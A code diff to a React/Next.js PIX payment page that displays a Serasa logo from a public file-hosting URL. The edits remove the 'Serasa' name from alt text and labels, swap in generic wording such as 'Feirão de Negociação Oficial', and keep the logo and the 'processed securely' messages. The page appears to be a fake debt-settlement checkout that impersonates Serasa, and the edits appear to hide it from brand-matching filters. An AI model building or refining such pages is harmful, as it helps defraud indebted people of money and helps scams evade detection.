@@ -24,14 +24,14 @@ function LoadingFallback() {
         <div className="max-w-4xl mx-auto flex items-center gap-3">
           <Image
             src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
-            alt="Serasa"
+            alt=""
             width={120}
             height={40}
             className="h-8 w-auto"
           />
           <div className="flex-1">
             <h1 className="font-semibold text-lg">Pagamento PIX</h1>
-            <p className="text-sm opacity-90">Feirao Limpa Nome</p>
+            <p className="text-sm opacity-90">Feirão de Negociação</p>
           </div>
         </div>
       </header>
@@ -187,14 +187,14 @@ function PagamentoContent() {
           <div className="max-w-4xl mx-auto flex items-center gap-3">
             <Image
               src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
-              alt="Serasa"
+              alt=""
               width={120}
               height={40}
               className="h-8 w-auto"
             />
             <div className="flex-1">
               <h1 className="font-semibold">Pagamento Confirmado</h1>
-              <p className="text-sm opacity-90">Serasa Limpa Nome</p>
+              <p className="text-sm opacity-90">Feirão de Negociação</p>
             </div>
           </div>
         </header>
@@ -210,7 +210,7 @@ function PagamentoContent() {
             
             <div className="bg-green-50 rounded-xl p-6 border border-green-200 mb-6">
               <p className="text-gray-600 mb-4">
-                Seu acordo foi confirmado e seu nome sera limpo em ate 5 dias uteis.
+                Seu acordo foi confirmado e sua situação será regularizada em até 5 dias úteis.
               </p>
               <div className="space-y-3 text-left">
                 <div className="flex justify-between items-center py-2 border-b border-green-200">
@@ -240,7 +240,7 @@ function PagamentoContent() {
 
             <div className="text-center text-xs text-gray-500">
               <p>Transacao processada com seguranca</p>
-              <p>Serasa Limpa Nome - Feirão de Negociacao</p>
+              <p>Feirão de Negociação Oficial</p>
               <p className="mt-2">ID: {pixData?.txid}</p>
             </div>
           </Card>
@@ -255,14 +255,14 @@ function PagamentoContent() {
         <div className="max-w-4xl mx-auto flex items-center gap-3">
           <Image
             src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-serasa-white-67a6038934dcf102cd8eb52d53c84823-yjRNE2BWqVov1rmSNnnOJxZGzE72xl.png"
-            alt="Serasa"
+            alt=""
             width={120}
             height={40}
             className="h-8 w-auto"
           />
           <div className="flex-1">
             <h1 className="font-semibold text-lg">Pagamento PIX</h1>
-            <p className="text-sm opacity-90">Feirao Limpa Nome</p>
+            <p className="text-sm opacity-90">Feirão de Negociação</p>
           </div>
           <div className="flex items-center gap-2 bg-white/20 rounded-full px-3 py-1">
             <Clock className="w-4 h-4" />
@@ -408,7 +408,7 @@ function PagamentoContent() {
 
             <div className="text-center text-xs text-gray-400 pb-6">
               <p className="font-medium">Pagamento processado com seguranca</p>
-              <p>Serasa Limpa Nome - Feirao de Negociacao</p>
+              <p>Feirão de Negociação Oficial</p>
             </div>
           </div>
         ) : null}
